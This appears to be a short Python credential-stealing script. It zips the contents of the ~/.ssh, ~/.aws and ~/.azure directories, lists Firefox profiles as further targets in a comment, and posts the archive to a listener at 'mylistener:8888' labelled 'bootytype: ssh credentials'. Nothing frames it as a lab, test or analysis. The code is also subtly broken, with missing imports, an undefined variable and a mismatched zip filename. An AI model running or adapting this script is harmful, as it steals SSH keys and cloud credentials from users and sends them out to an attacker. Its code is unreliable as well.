import requests
import zipfile
from zipfile import ZipFile


# interesting directories
"""
~/.ssh
~/.aws/
 ~/.azure/
~/Library/Application Support/Firefox/Profiles/<profilename>.default or 

"""

paths = ['~/.ssh','~/.azure','~/.aws']

# create the zip
zipObj = ZipFile('test.zip', 'w')

# Populate the zip
for path in paths:
    p = os.path.expanduser(path)
    [zipObj.write(mypath, f) for f in listdir(p) if isfile(join(p, f))]


# Close the zip
zipObj.close()


# post the file
url = 'http://mylistener:8888'
files={"archive": ("test.zip", open('sample.zip','rb'))}
values = {'bootytype': 'ssh credentials'}
r = requests.post(url, files=files, data=values)